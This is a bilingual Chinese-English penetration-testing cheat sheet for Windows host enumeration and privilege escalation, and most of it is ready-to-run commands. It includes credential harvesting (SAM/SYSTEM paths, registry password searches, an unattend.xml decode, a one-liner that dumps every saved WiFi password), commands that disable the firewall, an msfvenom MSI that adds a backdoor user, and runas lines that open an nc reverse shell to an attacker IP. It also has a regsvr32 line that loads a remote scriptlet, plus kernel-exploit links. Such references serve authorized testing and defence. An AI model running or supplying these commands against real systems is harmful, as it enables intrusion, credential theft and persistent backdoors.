### 目录

* [Checklist - Windows主机信息全面搜集](#checklist---windows主机信息全面搜集)
* [Checklist - Windows提权之前必要信息搜集](#checklist---windows提权之前必要信息搜集)
* [Checklist - EoP - Windows各种提权方式](#eop---windows各种提权方式)
  * [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)
  * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
  * [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
  * [EoP - Unquoted Service Paths](#eop---unquoted-service-paths)
  * [EoP - Named Pipes](#eop---named-pipes)
  * [EoP - Kernel Exploitation](#eop---kernel-exploitation)
  * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
  * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
  * [EoP - Evaluating Vulnerable Drivers](#eop---evaluating-vulnerable-drivers)
  * [EoP - Runas](#eop---runas)
  * [EoP - Abusing Shadow Copies](#eop---abusing-shadow-copies)
  * [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
  * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
  * [EoP - Impersonation Privileges](#eop---impersonation-privileges)
  * [EoP - Privileged File Write](#eop---privileged-file-write)
  * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
  * [References](#references)

### Checklist - Windows主机信息全面搜集

参考 [Windows-Notes-and-Cheatsheet.md](https://github.com/m0chan/m0chan.github.io/blob/master/_posts/2019-07-30-Windows-Notes-and-Cheatsheet.md)

注册表
```
# 导出注册表(全部)
regedit /e c:\all.reg

# 导出注册表(某项)
# 如 rdp服务的监听端口 (默认3389)
regedit /E c:\reg_rdp.reg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp"
```

系统日志
```
# 安全日志 - RDP日志
wevtutil qe Security "/q:*[System [(EventID=4648)]]" /rd:true /f:text
```

计划任务
```
# 查看
schtasks /query

# 查看 - 详细信息  # a list of all the scheduled tasks（Task Name / Next Run Time / Status)
schtasks /query /v /fo LIST

# 查看 - 所有任务的详细信息 CSV格式 # This includes additional information such as the task being run, schedule information etc
schtasks /query /v /fo CSV
```

### Checklist - Windows提权之前必要信息搜集

#### Windows 版本和配置
```
Windows Version and Configuration
# ---------------
# 查看综合信息
systeminfo

根据特征分析 存在以下特征 可判断为虚拟机:
特征1
系统制造商:       QEMU

特征2
网卡:             安装了 2 个 NIC。[01]: Red Hat VirtIO Ethernet Adapter

# ---------------
# 查看系统名称（windows系统 中文版）
systeminfo | findstr /B /C:"OS 名称" /C:"OS Version"

# 查看系统名称（windows系统 英文版）
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# ---------------
# Architecture
# 查询架构(不同语言的操作系统通用)

wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
如结果
OSArchitecture
64-bit

# ---------------
# List all env variables
# 查看所有环境变量

set

# 第三方powershell脚本 如
Get-ChildItem Env: | ft Key,Value

# ---------------
# List all drives
# 列出所有磁盘

wmic logicaldisk get caption || fsutil fsinfo drives

# 解释
# 命令wmic logicaldisk get caption 会获取:硬盘(本地磁盘)、移动存储设备(软盘驱动器 DVD驱动器)、网络位置(网络驱动器)
# 命令fsutil fsinfo drives 需要管理员权限 只会获取:硬盘(本地磁盘)、移动存储设备(软盘驱动器 DVD驱动器)   不会获取:网络位置(网络驱动器)
```

#### 用户枚举

```
User Enumeration
# ---------------
# Get current username
# 获取当前用户的用户名

echo %USERNAME% || whoami
$env:username

# ---------------
# 获取在线状态的用户的用户名
query user

# ---------------
# List user privilege
# 列出用户的权限

whoami /priv

# ---------------
# List all users
# 列出所有用户的用户名

net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name



# 查看当前AD域中的所有用户的用户名 (大概判断域的规模)
net user /domain

# ---------------
# List logon requirements; useable for bruteforcing
# 列出登录要求; 可用于暴力枚举

net accounts

如结果
强制用户在时间到期之后多久必须注销?:     从不
密码最短使用期限(天):                    0
密码最长使用期限(天):                    42
密码长度最小值:                          0
保持的密码历史记录长度:                  None
锁定阈值:                                从不
锁定持续时间(分):                        30
锁定观测窗口(分):                        30
计算机角色:                              WORKSTATION


# 查看当前AD域中的域内账户密码策略
net accounts /domain


# ---------------
# Get details about a user (i.e. administrator, admin, current user)
# 获取某个用户的详细信息（如administrator admin 当前用户）

net user administrator
net user admin
net user %USERNAME%


# 查看当前AD域中的指定用户 详细信息
net user epoadmin /domain

# ---------------
# List all local groups
# 查当前主机的所有的用户组的名称 - 了解不同组的职能 如IT HR ADMIN FILE...

net localgroup

# 第三方脚本
Get-LocalGroup | ft Name

# ---------------
# Get details about a group (i.e. administrators)
# 获取一个用户组的详细信息(查指定组中的成员列表)

net localgroup administrators

# 第三方脚本
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource

```

#### 网络枚举

```
Network Enumeration
# ---------------
# List all network interfaces, IP, and DNS.
# 列出所有网卡 IP DNS （得到信息 本机是否在域内 内网网段 网关Gateway)

ipconfig /all

如结果
Windows IP Configuration
   Host Name . . . . . . . . . . . . : b33f
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
Ethernet adapter Bluetooth Network Connection:
   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)
   Physical Address. . . . . . . . . : 0C-84-DC-62-60-29
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   
Ethernet adapter Local Area Connection:
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-56-79-35
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM
   Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM
   Default Gateway . . . . . . . . . : 192.168.0.1
   DHCP Server . . . . . . . . . . . : 192.168.0.1
   DHCPv6 IAID . . . . . . . . . . . : 234884137
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35
   DNS Servers . . . . . . . . . . . : 192.168.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled


# 第三方脚本
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft


# ---------------
# 查看本机的DNS缓存

ipconfig /displaydns

# ---------------
# List current routing table
# 列出当前路由表

route print

# 第三方脚本
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex


# ---------------
# List the ARP table
# 列出ARP表

# arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.
# arp -A 显示所有可用网卡的ARP（地址解析协议）缓存表

arp -A

# 第三方脚本
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State

# ---------------
# List all current connections
# 列出所有当前连接

# 查看本机所有的tcp udp端口连接 对应的pid
netstat -ano

# 查看本机所有的tcp udp端口连接 对应的发起程序
netstat -anob

# ---------------
# List firewall state and current configuration
# 列出防火墙状态和当前配置

netsh advfirewall firewall dump

netsh firewall show state

netsh firewall show config

# 查看当前正处于"已连接"状态的 ip port
netstat -ano | findstr "ESTABLISHED"

# 查看当前正处于"监听"状态的 ip port
netstat -ano | findstr "LISTENING"


# ---------------
# List firewall's blocked ports
# 列出防火墙的 封掉的端口 (powershell命令)

$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports

# ---------------
# Disable firewall
# 禁用防火墙

netsh firewall set opmode disable
netsh advfirewall set allprofiles state off

# ---------------
# 列出驱动程序
# This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes
than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.
# 这有时很有用，列出第三方驱动程序，即使是信誉良好的公司也可能包含不少漏洞，比如Swiss cheese。因为ring0开发不在大多数人的专业知识之内。

DRIVERQUERY

# ---------------
# List all network shares
# 列出所有网络共享

net share

# ---------------
# SNMP Configuration
# SNMP配置

reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s

# 第三方脚本
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

```


### EoP - Windows各种提权方式

#### 简介

提权(Privilege Escalation) 

权限提升 (EoP, Elevation of Privilege)

本地提权(LPE, Local Privilege Escalation)


#### EoP - 密码搜集

```
# ---------------
# SAM and SYSTEM files
# SAM和SYSTEM文件

%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

# ---------------
# Search for file contents
# 搜索文件内容

cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*



# ---------------
# Search for a file with a certain filename
# 搜索具有特定文件名的文件

dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini


# ---------------
# Search the registry for key names and passwords
# 在注册表中搜索key名称和密码

REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s


# ---------------
# Read a value of a certain sub key
# 读取某个子键的值

REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList


# ---------------
# Passwords in unattend.xml
# unattend.xml中的密码

# Location of the unattend.xml files.
# unattend.xml文件的位置
# The Metasploit module post/windows/gather/enum_unattend looks for these files.
# MSF模块post/windows/gather/enum_unattend可查找这些文件

C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# 示例内容

<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>

# 解码上述内容中的base64得到密码

$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
SecretSecurePassword1234*



# ---------------
# IIS Web config
# IIS Web配置

# 第三方脚本
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

# 文件
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config


# ---------------
# Other files
# 其他文件

%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b


# ---------------
# Wifi passwords
# Wifi密码

# Find AP SSID

netsh wlan show profile

# Get Cleartext Pass

netsh wlan show profile <SSID> key=clear

# Oneliner method to extract wifi passwords from all the access point.

cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on



# ---------------
# Passwords stored in services
# 存储在服务中的密码

# Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
# 使用SessionGopher保存PuTTY，WinSCP，FileZilla，SuperPuTTY和RDP的会话信息

# 第三方脚本
# https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

#### EoP - Processes Enumeration and Tasks

进程枚举 和 任务
```
# ---------------
# List Processes

# What processes are running?
# 哪些进程正在运行？

tasklist /v

# Which processes are running as "system"
# 哪些进程作为SYSTEM运行

tasklist /v /fi "username eq system"


# 第三方脚本
# 进程枚举 - 根据名称查找  如查找名为"Sysmon"的进程进程信息 注意Sysmon安装时可自定义进程名称
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }

# 进程枚举 - 根据名称查找
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize



# ---------------
# List services
# 服务枚举 - 系统命令 查看已经启动的 Windows 服务
net start

# 服务枚举 - 系统命令
sc query
wmic service list brief
tasklist /SVC


# 第三方脚本
# 服务枚举 - 根据描述查找
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"

# 服务枚举 - 根据名称查找
Get-Service | where-object {$_.DisplayName -like "*sysm*"}

# ---------------
# Do you have powershell magic?
# 查看powershell版本信息

REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion

# ---------------
# List installed programs
# 列出已安装的程序

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name


# ---------------

# Scheduled tasks
# 计划任务

schtasks /query /fo LIST 2>nul | findstr TaskName

# 第三方脚本
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State


# Startup tasks
# 自启动任务

wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```

#### EoP - Incorrect permissions in services

服务中的不正确权限

```
# ---------------
# A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.
# 以Administrator/SYSTEM身份运行且具有不正确文件权限的服务可能允许EoP(权限提升)。你可以替换二进制文件，并重新启动服务，实现权限提升。

# Often, services are pointing to writeable locations:
# 通常，服务指向可写位置：

# 1.Orphaned installs, not installed anymore but still exist in startup(孤儿installs,即现在并没有安装但仍存在于startup中)
# 2.DLL Hijacking
# 3.PATH directories with weak permissions(具有弱权限的PATH目录)


$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt


# Alternatively you can use the Metasploit exploit : exploit/windows/local/service_permissions
# 或者，您可以使用Metasploit的：exploit/windows/local/service_permissions

# 注意 检查权限的命令为
icacls (Windows Vista +)
cacls (Windows XP)

# 期望找到的是
BUILTIN\Users:(F)   -  (Full access)
BUILTIN\Users:(M)   -  (Modify access)
BUILTIN\Users:(W)   -   (Write-only access)
```


#### EoP - Windows Subsystem for Linux (WSL)

Windows子系统
```
# ---------------
# With root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port (no elevation needed). 
# 使用root权限的Windows Subsystem for Linux（WSL）允许用户在任何端口上创建bind shell（无需权限提升）

# Don't know the root password? No problem just set the default user to root W/ .exe --default-user root.
# 不知道root的密码也没问题，只需将默认用户设置为root

# Now start your bind shell or reverse.
# 启动bind shell或 reverse shell


wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'


# 二进制bash.exe文件在C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe

# Alternatively you can explore the WSL filesystem in the folder 
# 或者，您可以在文件夹中浏览WSL的文件系统

C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\

```

#### EoP - Unquoted Service Paths

EoP - 不带引号的服务路径
```
# ---------------
# 原理:
# Abusing misconfigured services
# 滥用错误配置的服务

# The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. 
# Microsoft Windows未加引号的服务路径枚举漏洞

# All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.
# 所有Windows服务都有一个可执行文件的路径。如果该路径未加引号并包含空格或其他分隔符，则服务将"首先"尝试访问父路径中的资源。


# 根据Windows处理CreateProcess这个API调用的方式来看，如果某个服务的"二进制文件的路径"没有用引号括起来，并且路径中有空白符号(空格等)或其他分隔符号，可能被用来提权。
# 参考https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa


# 例如 某个服务的二进制文件的路径为 C:\Program Files\sub dir\program name 可见这一路径没有被引号括住并且路径中含有空格 Windows尝试路径的顺序为：

C:\Program.exe
C:\Program Files\sub.exe
C:\Program Files\sub dir\program.exe
c:\program files\sub dir\program name.exe

# ---------------
# 实践:

# cmd命令 查看哪个服务的二进制文件没有被引号括住(如果该服务的权限高 则可能利用该错误配置进行Windows提权)
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# Powershell命令 参考https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

# Metasploit provides the exploit : exploit/windows/local/trusted_service_path
# Metasploit提供了一个模块: exploit/windows/local/trusted_service_path
```

#### EoP - Named Pipes

1. 查找"命名管道"(Find named pipes): `[System.IO.Directory]::GetFiles("\\.\pipe\")`
2. Check named pipes DACL: `pipesec.exe <named_pipe>`
3. Reverse engineering software
4. 通过某个"命名管道"发送数据(Send data throught the named pipe): `program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`

#### EoP - Kernel Exploitation

EoP - 内核利用

利用内核漏洞 参考合集 https://github.com/SecWiki/windows-kernel-exploits

如下

 #Security Bulletin&nbsp;&nbsp;&nbsp;#KB &nbsp;&nbsp;&nbsp;&nbsp;#Description&nbsp;&nbsp;&nbsp;&nbsp;#Operating System  
- [CVE-2020-0787](https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION) [Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability] (Windows 7/8/10, 2008/2012/2016/2019)
- [CVE-2020-0796](https://github.com/danigargu/CVE-2020-0796) [A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol handles certain requests, aka 'Windows SMBv3 Client/Server Remote Code Execution Vulnerability'] (Windows 1903/1909)
- [CVE-2019-1458](https://github.com/unamer/CVE-2019-1458) [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016)
- [CVE-2019-0803](https://github.com/ExpLife0011/CVE-2019-0803) [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016/2019)
- [CVE-2018-8639](https://github.com/ze0r/CVE-2018-8639-exp) [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016)
- [CVE-2018-1038](https://gist.github.com/xpn/3792ec34d712425a5c47caf5677de5fe) [Windows Kernel Elevation of Privilege Vulnerability]  (Windows 7 SP1/Windows Server 2008 R2 SP1)
- [CVE-2018-0743](https://github.com/saaramar/execve_exploit) [Windows Subsystem for Linux Elevation of Privilege Vulnerability]  (Windows 10 version 1703/Windows 10 version 1709/Windows Server version 1709)
- [CVE-2018-8453](https://github.com/ze0r/cve-2018-8453-exp) [An elevation of privilege vulnerability in Windows Win32k component]  (>= windows 8.1)
- [CVE-2018-8440](https://github.com/sourceincite/CVE-2018-8440) [Windows ALPC Elevation of Privilege Vulnerability]  (windows 7/8.1/10/2008/2012/2016)
- [MS17-017](./MS17-017) 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)
- [CVE-2017-8464](./CVE-2017-8464) 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
- [CVE-2017-0213](./CVE-2017-0213) 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
- [CVE-2018-0833](./CVE-2018-0833)   [SMBv3 Null Pointer Dereference Denial of Service]  (Windows 8.1/Server 2012 R2)
- [CVE-2018-8120](./CVE-2018-8120)   [Win32k Elevation of Privilege Vulnerability]  (Windows 7 SP1/2008 SP2,2008 R2 SP1)
- [MS17-010](./MS17-010) 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)
- ...


#### EoP - AlwaysInstallElevated

```
# ---------------
# Check if these registry values are set to "1".
# 检查这些注册表值是否设置为“1”。

$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Then create an MSI package and install it.
# 然后创建一个MSI包并安装它。

$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
$ msiexec /quiet /qn /i C:\evil.msi

# 可以使用Metasploit的 exploit/windows/local/always_install_elevated
```


#### EoP - Insecure GUI apps

EoP - 不安全的GUI应用程序

```
# ---------------
# Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.
# 作为SYSTEM运行的应用程序允许用户派生出一个CMD,或能能够浏览目录.

# Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"
# 示例：“Windows帮助和支持”（Windows + F1），搜索“命令提示符”，单击“单击以打开命令提示符”
```

#### EoP - Evaluating Vulnerable Drivers

Look for vuln drivers loaded, we often don't spend enough time looking at this:

```powershell
# https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery

PS C:\Users\Swissky> driverquery.exe /fo table
Module Name  Display Name           Driver Type   Link Date
============ ====================== ============= ======================
1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM
3ware        3ware                  Kernel        5/18/2015 6:28:03 PM
ACPI         Microsoft ACPI Driver  Kernel        12/9/1975 6:17:08 AM
AcpiDev      ACPI Devices driver    Kernel        12/7/1993 6:22:19 AM
acpiex       Microsoft ACPIEx Drive Kernel        3/1/2087 8:53:50 AM
acpipagr     ACPI Processor Aggrega Kernel        1/24/2081 8:36:36 AM
AcpiPmi      ACPI Power Meter Drive Kernel        11/19/2006 9:20:15 PM
acpitime     ACPI Wake Alarm Driver Kernel        2/9/1974 7:10:30 AM
ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM
<SNIP>

PS C:\Users\Swissky> DriverQuery.exe --no-msft
[+] Enumerating driver services...
[+] Checking file signatures...
Citrix USB Filter Driver
    Service Name: ctxusbm
    Path: C:\Windows\system32\DRIVERS\ctxusbm.sys
    Version: 14.11.0.138
    Creation Time (UTC): 17/05/2018 01:20:50
    Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US
    Signer: CN="Citrix Systems, Inc.", OU=XenApp(ClientSHA256), O="Citrix Systems, Inc.", L=Fort Lauderdale, S=Florida, C=US
<SNIP>
```

#### EoP - Runas

```
# ---------------
# Use the cmdkey to list the stored credentials on the machine.
# 使用cmdkey列出计算机上存储的凭据

cmdkey /list
如结果
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator


# Then you can use runas with the /savecred options in order to use the saved credentials. 
# The following example is calling a remote binary via an SMB share.
# 然后，您可以用runas 的 /savecred 选项，以便使用保存的凭据。
# 以下示例通过SMB共享调用远程二进制文件。

runas /savecred /user:WORKGROUP\Administrator "\\10.0.0.1\SHARE\evil.exe"


# Using runas with a provided set of credential.
# 用已获取到的一组凭据 执行runas

C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"


$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$ computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

#### EoP - Abusing Shadow Copies

If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.

```powershell
# List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows
  
# List shadow copies using diskshadow
diskshadow list shadows all
  
# Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

#### EoP - From local administrator to NT SYSTEM

```powershell
PsExec.exe -i -s cmd.exe
```

#### EoP - Living Off The Land Binaries and Scripts

Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/

> The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.

A LOLBin/Lib/Script must:

* Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft.
Have extra "unexpected" functionality. It is not interesting to document intended use cases.
Exceptions are application whitelisting bypasses
* Have functionality that would be useful to an APT or red team

```powershell
wmic.exe process call create calc
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
Microsoft.Workflow.Compiler.exe tests.xml results.xml
```

#### EoP - Impersonation Privileges

Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege | Impact | Tool | Execution path | Remarks |
| --- | --- | --- | --- | --- |
|`SeAssignPrimaryToken`| ***Admin*** | 3rd party tool | *"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"* | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon. |
|`SeBackup`| **Threat** | ***Built-in commands*** | Read sensitve files with `robocopy /b` |- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br> <br>- `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open files.<br> <br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter. |
|`SeCreateToken`| ***Admin*** | 3rd party tool | Create arbitrary token including local admin rights with `NtCreateToken`. ||
|`SeDebug`| ***Admin*** | **PowerShell** | Duplicate the `lsass.exe` token.  | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) |
|`SeLoadDriver`| ***Admin*** | 3rd party tool | 1. Load buggy kernel driver such as `szkg64.sys`<br>2. Exploit the driver vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin command. i.e.: `fltMC sysmondrv` | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)  |
